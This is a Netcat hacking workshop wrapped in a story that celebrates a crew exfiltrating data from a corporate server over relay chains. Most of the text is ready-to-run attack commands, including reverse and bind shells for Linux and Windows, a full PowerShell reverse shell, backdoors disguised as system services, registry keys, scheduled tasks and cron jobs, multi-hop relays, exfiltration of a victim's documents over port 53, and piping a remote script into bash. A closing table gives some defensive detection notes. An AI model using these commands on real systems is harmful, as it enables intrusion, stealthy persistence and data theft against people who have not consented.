# Operation CENOTE — Netcat: The Swiss Army Knife of Hacking
## A Zero-to-Hero Workshop (45 minutes)

> *"El que controla el canal, controla la conversación."*
> *"He who controls the channel, controls the conversation."*
>
> — **Ix_Chel**, Mérida underground, 2011

---

## Mérida, Yucatán — August 2011

The cenote was dark at 3 AM. Not that anyone was swimming.

**Ix_Chel** — real name withheld, computer science dropout from UADY, 23 years old — sat in a hammock on the roof of a colonial building in Centro Histórico, laptop balanced on her knees, a lukewarm Jarritos beside her. The city smelled like wet stone and jasmine. From the street below, cumbia leaked out of a tienda that should have closed four hours ago.

She had a problem that was also, in a beautiful way, a geometry problem.

Three machines. Different networks. No VPN. No public IPs. No budget. And on the other end of a shaky IRC connection, a crew from Buenos Aires — **El Pulpo**, **La Negra**, and someone who went by **Cero** — who had promised they could exfiltrate a specific document from a corporate server in Monterrey that was hemorrhaging worker salary data to shell accounts in the Cayman Islands.

The Monterrey machine had `nc` installed. So did Ix_Chel's box. So did the jump server in Guadalajara that El Pulpo had borrowed from a friendly sysadmin who asked no questions.

*"Ix, tenés nc?"* — El Pulpo typed from Buenos Aires, 3,400 km away.

*"Siempre."*

*"Entonces ya ganamos."*

She smiled. He was right. You don't need Metasploit, you don't need a $50,000 SIEM, you don't need a zero-day when you have Netcat, patience, and a relay chain. What followed was three hours of piped data, carefully choreographed across three continents, a cenote's worth of packets moving silently through the dark.

The document made it to a journalist by sunrise. The shell accounts were frozen by Monday.

Nobody sold a CVE that night. Nobody needed to.

---

## Workshop Overview

| Item | Detail |
|---|---|
| **Duration** | 45 minutes |
| **Level** | Intermediate (comfortable with CLI) |
| **Platforms** | Linux (Ubuntu/ParrotOS) + Windows |
| **Tools** | `nc`, `ncat`, `ncat.exe`, PowerShell |
| **Goal** | Master Netcat for recon, shells, relays, and backdoors |

---

## Lab Environment

You need at minimum **two machines** (VMs work perfectly):

```
[Attacker]  192.168.56.10   (ParrotOS / Ubuntu)
[Target]    192.168.56.20   (Ubuntu Server or Windows)
[Relay]     192.168.56.30   (optional — for relay exercises)
```

All exercises assume a controlled, authorized lab environment. **Never run these against systems you do not own or have explicit written permission to test.**

---

## Part 1 — What IS Netcat? (5 min)

Netcat is a raw TCP/UDP socket utility. That's it. It reads and writes data across network connections — no protocol assumptions, no encryption, no handshakes beyond what you tell it to do. It is the `cat` command for the network.

```
Your keyboard  ──►  nc  ──►  TCP socket  ──►  nc  ──►  screen / file / shell
```

Because it's so bare, it's also infinitely composable. You can pipe anything into it and pipe its output anywhere. This is its superpower — and exactly why pentesters have loved it since 1995.

### Netcat Flavors — Know the Difference

| Variant | Platform | Notes |
|---|---|---|
| `nc` (OpenBSD) | Linux (default on Ubuntu/ParrotOS) | No `-e` flag (by design — security hardened) |
| `nc` (traditional/GNU) | Some Linux distros | Has `-e` flag |
| `ncat` | Linux + Windows (ships with Nmap) | Full-featured, SSL support, recommended for pentesting |
| `netcat.exe` / `ncat.exe` | Windows | ncat.exe is the Nmap port; most reliable on Windows |
| PowerShell TCPClient | Windows | Native, no binary needed |

> **Key difference:** OpenBSD's `nc` (what you have on Ubuntu by default) **does not support `-e`** (exec). This was intentional to prevent misuse. For `-e` functionality on Linux, use **ncat** or use FIFOs (covered below).

Check what you have:
```bash
# Linux
nc -h 2>&1 | head -5
ncat --version

# Windows (PowerShell)
ncat.exe --version
```

---

## Part 2 — Fundamentals: Chat, Transfer, Scan (10 min)

### 2.1 — The Netcat Handshake (Two-Terminal Chat)

This is the "hello world" of Netcat. Open two terminals.

**Terminal A (listener / "server"):**
```bash
nc -lvnp 4444
# -l  listen mode
# -v  verbose
# -n  no DNS resolution (faster)
# -p  port number
```

**Terminal B (connector / "client"):**
```bash
nc 127.0.0.1 4444
```

Type in either terminal. Text appears in the other. You just built a TCP chat channel from scratch. Now kill it with `Ctrl+C`.

**Windows equivalent (ncat.exe):**
```powershell
# Listener
ncat.exe -lvnp 4444

# Connector
ncat.exe 192.168.56.10 4444
```

---

### 2.2 — File Transfer (No SCP? No Problem)

The classic CTF and field move. No SSH, no FTP, no HTTP server — just Netcat.

**Receiver (sets up listener FIRST):**
```bash
nc -lvnp 5555 > received_file.txt
```

**Sender:**
```bash
nc -w3 192.168.56.10 5555 < secret.txt
# -w3  timeout after 3 seconds of inactivity (auto-close)
```

Transfer a binary (same syntax — Netcat is byte-agnostic):
```bash
# Receiver
nc -lvnp 5555 > malware_sample.exe

# Sender
nc -w3 192.168.56.10 5555 < malware_sample.exe
```

**Windows → Linux transfer:**
```powershell
# On Windows (sender)
ncat.exe -w3 192.168.56.10 5555 < C:\Users\victim\secret.docx
```

```bash
# On Linux (receiver)
nc -lvnp 5555 > stolen.docx
```

> **Field tip:** Use `md5sum` on both ends to verify transfer integrity.

---

### 2.3 — Port Scanning (Poor Man's Nmap)

```bash
# Single port
nc -zv 192.168.56.20 22
# -z  zero-I/O mode (just check if port is open)

# Port range (slow but works without nmap)
nc -zvn 192.168.56.20 20-100 2>&1 | grep succeeded

# UDP scan
nc -zvnu 192.168.56.20 53 161 123
```

**Windows:**
```powershell
ncat.exe -zv 192.168.56.20 80
```

---

### 2.4 — Banner Grabbing (Service Fingerprinting)

```bash
# HTTP banner
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc -w3 192.168.56.20 80

# SMTP banner (just connect and read)
nc -w5 192.168.56.20 25

# SSH banner
nc -w3 192.168.56.20 22

# FTP banner
nc -w3 192.168.56.20 21
```

This tells you software versions without sending a single packet that looks like a scan.

---

## Part 3 — Reverse Shells (10 min)

A **reverse shell** has the target connect *back* to the attacker. Why? Because firewalls almost always allow outbound connections. Inbound? Blocked. So flip the direction.

```
[Target]  ──►  connects out  ──►  [Attacker listener]
                                         │
                                    gets a shell
```

### 3.1 — Linux Reverse Shell

**Attacker (listener):**
```bash
nc -lvnp 4444
```

**Target (Linux — using bash & /dev/tcp, no nc needed on target):**
```bash
bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
```

**Target (Linux — using ncat with `-e`):**
```bash
ncat 192.168.56.10 4444 -e /bin/bash
```

**Target (Linux — using FIFO pipe with OpenBSD nc, no `-e` needed):**
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.56.10 4444 > /tmp/f
```

> The FIFO trick is essential. OpenBSD `nc` won't give you `-e`, but a named pipe creates the same bidirectional flow. Understanding *why* this works is key: the FIFO loops bash's output back into nc's input.

---

### 3.2 — Windows Reverse Shell

**Attacker (listener — same as before):**
```bash
nc -lvnp 4444
```

**Target (Windows — using ncat.exe):**
```powershell
ncat.exe 192.168.56.10 4444 -e cmd.exe
# or for PowerShell:
ncat.exe 192.168.56.10 4444 -e powershell.exe
```

**Target (Windows — PowerShell one-liner, no binary needed):**
```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.56.10", 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | % {0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

> This PowerShell shell requires no external binary — useful when you can't drop files to disk.

---

### 3.3 — Bind Shell (When You Can't Get Outbound)

The bind shell is the *opposite* — the target listens, attacker connects in. Use this when the target has no outbound restrictions but the attacker can reach the target directly.

```
[Attacker]  ──►  connects in  ──►  [Target listener + shell]
```

**Target (Linux):**
```bash
ncat -lvnp 5555 -e /bin/bash
```

**Target (Windows):**
```powershell
ncat.exe -lvnp 5555 -e cmd.exe
```

**Attacker:**
```bash
nc 192.168.56.20 5555
```

---

## Part 4 — Netcat as a Backdoor (5 min)

This is where Netcat earns its reputation as the most dangerous 20KB program ever written.

### 4.1 — Persistent Listener on Linux (Systemd)

Create a service that restarts itself and hands out shells:

```bash
# /etc/systemd/system/nc-backdoor.service
[Unit]
Description=Network Debug Service
After=network.target

[Service]
ExecStart=/usr/bin/ncat -lvnp 8080 -e /bin/bash --keep-open
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
```

```bash
systemctl enable nc-backdoor
systemctl start nc-backdoor
```

`--keep-open` (ncat flag) makes the listener accept *multiple* connections — one after another. Without it, the service dies after the first session.

---

### 4.2 — Persistent Backdoor on Windows (Registry + Startup)

```powershell
# Drop ncat.exe somewhere inconspicuous
Copy-Item ncat.exe C:\Windows\Temp\svchelper.exe

# Add to registry run key (persists across reboots)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "SystemHelper" `
  -Value "C:\Windows\Temp\svchelper.exe -lvnp 8080 -e cmd.exe"
```

Or via Scheduled Task (more stealthy, runs as SYSTEM if you have privesc):
```powershell
schtasks /create /tn "WindowsUpdateHelper" /tr "C:\Windows\Temp\svchelper.exe -lvnp 8080 -e cmd.exe" /sc onstart /ru SYSTEM /f
```

> **Defender note:** Modern Windows Defender and EDR solutions will flag `ncat.exe -e cmd.exe`. In a real engagement, this would be obfuscated or replaced with a C2 agent. Here, we're learning the mechanic.

---

### 4.3 — Linux Cron Backdoor

For situations where you can't write a systemd service but you have cron access:

```bash
# Runs every minute, reconnects if session dies
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'
```

```bash
# Add silently (no crontab -e noise)
(crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/192.168.56.10/4444 0>&1") | crontab -
```

This is the "low and slow" backdoor. It won't survive a cron audit, but it's trivially simple.

---

## Part 5 — Relay Chains (10 min)

This is the technique that won Ix_Chel and El Pulpo their night. A relay bounces traffic through intermediate hosts, making attribution harder and bypassing segmented networks.

```
[Attacker]  ──►  [Relay 1]  ──►  [Relay 2]  ──►  [Target]
192.168.56.10    192.168.56.30    10.10.10.5    10.10.10.20
```

Each relay has access to the *next* segment. The attacker only needs to reach Relay 1.

### 5.1 — Simple Linux Relay (FIFO Method)

On **Relay** (192.168.56.30):
```bash
# Forward everything from port 5555 → Target:4444
rm -f /tmp/relay; mkfifo /tmp/relay
nc -lvnp 5555 < /tmp/relay | nc 10.10.10.20 4444 > /tmp/relay
```

**Target** (listening):
```bash
nc -lvnp 4444
```

**Attacker** (connects to relay, reaches target):
```bash
nc 192.168.56.30 5555
```

The FIFO creates the bidirectional bridge between the two `nc` instances on the relay. Data flows both ways through the pipe.

---

### 5.2 — Multi-Hop Relay Chain (Three Hops)

```
[Attacker]  →  [Relay A]  →  [Relay B]  →  [Target shell]
```

**Target (innermost — bind shell):**
```bash
ncat -lvnp 9001 -e /bin/bash
```

**Relay B (middle hop — forwards to Target):**
```bash
rm -f /tmp/rb; mkfifo /tmp/rb
nc -lvnp 9002 < /tmp/rb | nc 10.10.10.20 9001 > /tmp/rb
```

**Relay A (outer hop — forwards to Relay B):**
```bash
rm -f /tmp/ra; mkfifo /tmp/ra
nc -lvnp 9003 < /tmp/ra | nc 10.10.10.5 9002 > /tmp/ra
```

**Attacker:**
```bash
nc 192.168.56.30 9003
# You now have a shell on 10.10.10.20 through two hops
```

---

### 5.3 — Relay on Windows (ncat.exe)

```powershell
# Relay: forward port 5555 → 10.10.10.20:4444
ncat.exe --broker -lvnp 5555
# Then separately pipe using cmd:
cmd /c "ncat.exe -lvnp 5555 | ncat.exe 10.10.10.20 4444"
```

Alternatively, use PowerShell to build the relay:
```powershell
$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, 5555)
$listener.Start()
$inbound = $listener.AcceptTcpClient()
$outbound = New-Object System.Net.Sockets.TcpClient("10.10.10.20", 4444)

$inStream = $inbound.GetStream()
$outStream = $outbound.GetStream()

$job1 = [System.Threading.Tasks.Task]::Run({ $inStream.CopyTo($outStream) })
$job2 = [System.Threading.Tasks.Task]::Run({ $outStream.CopyTo($inStream) })
[System.Threading.Tasks.Task]::WaitAll($job1, $job2)
```

---

## Part 6 — Other Ethical Hacking Use Cases (5 min)

### 6.1 — Web Server Simulation (HTTP Response Crafting)

Test how a client handles responses without running a real web server:
```bash
# Serve a fake HTTP response
while true; do
  echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>pwned</h1>" \
  | nc -lvnp 80 -w1
done
```

Useful for: phishing simulation, testing client behavior, capturing credentials sent to a fake login page.

---

### 6.2 — Credential Capture (Netcat Honeypot)

```bash
# Listen on FTP port, log everything sent to you
nc -lvnp 21 | tee ftp_capture.log
```

When a misconfigured client auto-sends credentials (FTP, Telnet, SMTP AUTH), you capture them in plaintext.

---

### 6.3 — Data Exfiltration Over Uncommon Ports

Bypass DLP tools that only inspect common ports:
```bash
# Exfil over port 53 (DNS-like traffic, often allowed outbound)
tar czf - /home/victim/Documents | nc -w5 192.168.56.10 53

# Receiver
nc -lvnp 53 | tar xzf -
```

---

### 6.4 — Netcat as a Proxy Diagnostic Tool

Check if a proxy is transparent or intercepting:
```bash
# Connect through proxy, see what headers it adds
nc proxy.corp.internal 3128
CONNECT 192.168.56.20:4444 HTTP/1.1
Host: 192.168.56.20:4444

```

---

### 6.5 — UDP Exfiltration / C2 Channel

Most IDS/IPS focus on TCP. UDP is noisier but less inspected for small payloads:
```bash
# Receiver (attacker)
nc -lvnup 53

# Sender (target)
echo "hostname=$(hostname);user=$(whoami)" | nc -u 192.168.56.10 53
```

---

### 6.6 — Serve a Payload During Post-Exploitation

After landing a shell, pull additional tools without SCP or HTTP server:
```bash
# On attacker: serve your privilege escalation script
nc -lvnp 8888 < linpeas.sh

# On target (from the shell you already have):
nc 192.168.56.10 8888 | bash
```

No files written to disk. Runs entirely in memory.

---

## Platform Differences Cheat Sheet

| Feature | Linux `nc` (OpenBSD) | Linux `ncat` | Windows `ncat.exe` | Windows PowerShell |
|---|---|---|---|---|
| `-e` exec flag | ❌ No | ✅ Yes | ✅ Yes | N/A |
| `--keep-open` | ❌ No | ✅ Yes | ✅ Yes | Manual |
| SSL/TLS | ❌ No | ✅ Yes | ✅ Yes | ✅ Yes |
| UDP | ✅ `-u` | ✅ `-u` | ✅ `-u` | Limited |
| FIFO relay | ✅ Best method | ✅ Works | ❌ No mkfifo | ✅ CopyTo() |
| Broker mode | ❌ No | ✅ `--broker` | ✅ `--broker` | Manual |
| Timeout `-w` | ✅ Yes | ✅ `-w` | ✅ `-w` | Manual |
| Shipped by default | ✅ Ubuntu/ParrotOS | ❌ (install nmap) | ❌ (drop binary) | ✅ Always |

---

## Quick Reference — Command Card

```
# Listen
nc -lvnp PORT

# Connect
nc HOST PORT

# File send
nc -w3 HOST PORT < file

# File receive
nc -lvnp PORT > file

# Reverse shell (bash)
bash -i >& /dev/tcp/HOST/PORT 0>&1

# Reverse shell (ncat)
ncat HOST PORT -e /bin/bash

# Bind shell (ncat)
ncat -lvnp PORT -e /bin/bash

# FIFO relay
rm -f /tmp/f; mkfifo /tmp/f
nc -lvnp PORT_IN < /tmp/f | nc HOST PORT_OUT > /tmp/f

# Port scan
nc -zvn HOST START-END 2>&1 | grep succeeded

# Banner grab
echo "" | nc -w3 HOST PORT

# Keep-open listener (ncat)
ncat -lvnp PORT -e /bin/bash --keep-open
```

---

## Detection & Defense (Purple Team Notes)

Because we wear a gray hat and love the purple team:

| Attack | Detection Method |
|---|---|
| Netcat listener | `ss -tlnp` or `netstat -tlnp` — look for `nc`/`ncat` process |
| Reverse shell | Outbound connections from unexpected processes; EDR parent-child analysis |
| FIFO relay | Look for `mkfifo` in process history; audit `/tmp` for named pipes |
| Cron backdoor | `crontab -l -u root`; monitor `/var/spool/cron/` for changes |
| Registry backdoor | Monitor `HKCU\...\Run` and `HKLM\...\Run` keys |
| Unusual file transfers | Network baseline anomalies; DLP on port-agnostic content inspection |

**Defensive one-liner — find suspicious listeners:**
```bash
ss -tlnp | grep -v -E ':(22|80|443|3306|5432)\s'
```

**Hunt for active Netcat processes:**
```bash
ps aux | grep -E '\bnc\b|\bncat\b|\bnetcat\b'
lsof -i | grep -E 'nc|ncat'
```

---

## Lab Exercises

### Exercise 1 — Chat (5 min)
Set up a two-way chat between your two VMs using `nc`. Then repeat it using UDP (`-u`). Notice any differences in behavior when you Ctrl+C one end.

### Exercise 2 — File Transfer (5 min)
Transfer a 10MB file between Linux and Windows. Use `md5sum` (Linux) and `Get-FileHash` (Windows) to verify integrity. Then reverse the direction.

### Exercise 3 — Reverse Shell (10 min)
- Establish a reverse shell from Linux target → Linux attacker
- Establish a reverse shell from Windows target → Linux attacker using `ncat.exe`
- Try the FIFO method on OpenBSD nc without `-e`
- **Bonus:** Try the bash `/dev/tcp` method and the PowerShell one-liner

### Exercise 4 — Relay Chain (10 min)
Build a 2-hop relay using three VMs. Confirm you can run commands on the innermost machine from the outermost attacker. Trace the traffic with `tcpdump` on the relay to see what it looks like from the middle.

### Exercise 5 — Backdoor (5 min)
Plant a cron-based reverse shell backdoor. Kill the nc session and wait 60 seconds. Confirm it reconnects automatically.

---

## Recommended Reading & Resources

- `man nc`, `ncat --help` — always your first stop
- [Ncat User's Guide](https://nmap.org/ncat/guide/) — the definitive ncat reference
- *The Hacker Playbook 3* — Peter Kim — real-world Netcat field usage
- [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- DEFCON talks: search "netcat" on media.defcon.org — some classics from early 2000s

---

## Final Thought

Ix_Chel wrapped up her relay at 5:47 AM. The last hop disconnected cleanly. She closed the laptop, swung in the hammock, and watched the sky over Mérida go from black to deep blue.

Netcat hadn't failed her. It never did.

It's not the flashiest tool. It won't get a CVE assigned to it. There's no GUI, no vendor, no support contract. It's just bytes, sockets, and pipes — the same building blocks that every other protocol is made of. When you understand Netcat, you understand networking at the seam where everything happens.

That's not a vulnerability. That's knowledge.

**DEFCON vibes. Gray hat. Purple team. Go learn something.**

---

